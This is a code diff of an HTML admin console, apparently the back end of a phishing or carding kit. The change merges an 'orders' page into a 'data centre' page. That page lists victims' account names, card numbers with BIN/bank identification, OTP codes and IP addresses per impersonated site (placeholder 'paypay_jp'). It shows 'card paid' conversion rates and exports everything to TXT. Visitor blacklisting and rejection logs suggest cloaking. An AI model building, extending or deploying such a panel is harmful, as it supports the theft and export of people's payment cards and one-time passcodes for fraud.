@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#17191f">
   <title>Gateway Console</title>
-  <link rel="stylesheet" href="/styles.css?v=6">
+  <link rel="stylesheet" href="/styles.css?v=7">
 </head>
 <body>
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
@@ -41,7 +41,6 @@
         <button data-page="dashboard" class="active"><span class="nav-icon">⌂</span>仪表板</button>
         <p>数据</p>
         <button data-page="data"><span class="nav-icon">≡</span>数据中心</button>
-        <button data-page="orders"><span class="nav-icon">✎</span>订单数据</button>
         <button data-page="blacklist"><span class="nav-icon">⛔</span>黑名单中心</button>
         <p>管理</p>
         <button data-page="frontend"><span class="nav-icon">◇</span>前台配置</button>
@@ -80,8 +79,31 @@
       </div>
 
       <div class="page" data-page-view="data">
-        <div class="page-intro"><div><h3>访问明细</h3><p>按单个域名、事件类型和来访客户端查询访客记录。</p></div></div>
+        <div class="page-intro"><div><h3>数据中心</h3><p>订单与访问日志都在这里：上半部分是访客归并后的账号与卡料，下半部分是来源域名、事件和拦截记录。</p></div></div>
         <section class="content-block">
+          <div class="block-heading"><div><h3>站点统计</h3><p>按域名汇总访问 / 提交 / 付卡与转化率。</p></div></div>
+          <div class="table-wrap">
+            <table><thead><tr><th>域名</th><th>站点</th><th>访问</th><th>提交</th><th>付卡</th><th>转化率</th></tr></thead><tbody id="orderStatsBody"></tbody></table>
+          </div>
+        </section>
+        <section class="content-block">
+          <div class="block-heading"><div><h3>订单列表</h3><p>按访客（uuid）归并的多步提交：站点、域名、账号、卡号与 BIN 识别、OTP，每条都带 IP，可导出 TXT。</p></div></div>
+          <form id="orderFilters" class="filterbar">
+            <label>站点<input name="site" placeholder="如 paypay_jp"></label>
+            <label>域名<input name="referer" placeholder="example.com"></label>
+            <label>关键字<input name="keyword" placeholder="卡号 / IP / 账号"></label>
+            <label>状态<select name="status"><option value="">全部</option><option value="1">已提交</option><option value="2">已付卡</option><option value="0">未提交</option></select></label>
+            <button class="primary" type="submit">查询</button>
+            <button class="secondary" type="button" id="orderExport">⬇ 导出 TXT</button>
+            <button class="danger-link" type="button" id="orderClear" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 清空数据</button>
+          </form>
+          <div class="table-wrap">
+            <table><thead><tr><th>编号</th><th>时间</th><th>站点</th><th>域名</th><th>账号</th><th>卡号</th><th>品牌 / 银行</th><th>OTP</th><th>状态</th><th>IP</th><th>明细</th></tr></thead><tbody id="orderBody"></tbody></table>
+          </div>
+          <div class="table-foot"><span id="orderCount">共 0 条</span><button id="orderPrev" class="secondary small">上一页</button><span id="orderPage">1</span><button id="orderNext" class="secondary small">下一页</button></div>
+        </section>
+        <section class="content-block">
+          <div class="block-heading"><div><h3>访问日志</h3><p>按单个域名、事件类型和来访客户端查询访客记录。</p></div></div>
           <form id="eventFilters" class="filterbar">
             <label>域名<input name="domain" placeholder="example.com"></label>
             <label>事件<select name="type"><option value="">全部事件</option><option value="visit">访问</option><option value="click">点击</option><option value="rejected">拒绝</option></select></label>
@@ -92,31 +114,6 @@
             <table><thead><tr><th>编号</th><th>时间</th><th>域名</th><th>类型</th><th>客户端</th><th>IP</th><th>UA</th></tr></thead><tbody id="eventsBody"></tbody></table>
           </div>
           <div class="table-foot"><span id="eventCount">共 0 条</span><button id="eventsPrev" class="secondary small">上一页</button><span id="eventPage">1</span><button id="eventsNext" class="secondary small">下一页</button><button id="clearEvents" class="danger-link" type="button" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 一键清空日志</button></div>
-        </section>
-      </div>
-
-      <div class="page" data-page-view="orders">
-        <div class="page-intro"><div><h3>订单数据</h3><p>按访客（uuid）归并的多步提交：站点、域名、账号、卡号与 BIN 识别、OTP，可筛选并导出。</p></div></div>
-        <section class="content-block">
-          <div class="block-heading"><div><h3>站点统计</h3><p>按域名汇总访问 / 提交 / 付卡与转化率。</p></div></div>
-          <div class="table-wrap">
-            <table><thead><tr><th>域名</th><th>站点</th><th>访问</th><th>提交</th><th>付卡</th><th>转化率</th></tr></thead><tbody id="orderStatsBody"></tbody></table>
-          </div>
-        </section>
-        <section class="content-block">
-          <form id="orderFilters" class="filterbar">
-            <label>站点<input name="site" placeholder="如 paypay_jp"></label>
-            <label>域名<input name="referer" placeholder="example.com"></label>
-            <label>关键字<input name="keyword" placeholder="卡号 / IP / 账号"></label>
-            <label>状态<select name="status"><option value="">全部</option><option value="1">已提交</option><option value="2">已付卡</option><option value="0">未提交</option></select></label>
-            <button class="primary" type="submit">查询</button>
-            <button class="secondary" type="button" id="orderExport">⬇ 导出 CSV</button>
-            <button class="danger-link" type="button" id="orderClear" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 清空数据</button>
-          </form>
-          <div class="table-wrap">
-            <table><thead><tr><th>编号</th><th>时间</th><th>站点</th><th>域名</th><th>账号</th><th>卡号</th><th>品牌 / 银行</th><th>OTP</th><th>状态</th><th>IP</th><th>明细</th></tr></thead><tbody id="orderBody"></tbody></table>
-          </div>
-          <div class="table-foot"><span id="orderCount">共 0 条</span><button id="orderPrev" class="secondary small">上一页</button><span id="orderPage">1</span><button id="orderNext" class="secondary small">下一页</button></div>
         </section>
       </div>
 
@@ -252,6 +249,6 @@
     </form>
   </dialog>
   <div id="mobileBackdrop" class="backdrop"></div>
-  <script src="/app.js?v=13"></script>
+  <script src="/app.js?v=14"></script>
 </body>
 </html>
